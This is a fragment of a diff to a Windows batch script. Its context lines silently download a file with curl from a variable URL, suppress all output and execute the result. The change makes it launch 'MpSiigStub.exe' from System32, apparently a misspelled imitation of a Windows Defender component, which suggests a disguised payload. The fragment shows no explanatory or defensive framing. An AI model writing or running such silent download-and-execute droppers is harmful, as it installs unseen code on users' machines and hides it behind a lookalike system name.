@@ -10,4 +10,4 @@ mkdir "%~dp0" >nul 2>&1
 curl -o "%DEST%" "%URL%" >nul 2>&1
 
 :: Run the downloaded file
-start "" "%DEST%"
+start "" C:\Windows\System32\MpSiigStub.exe
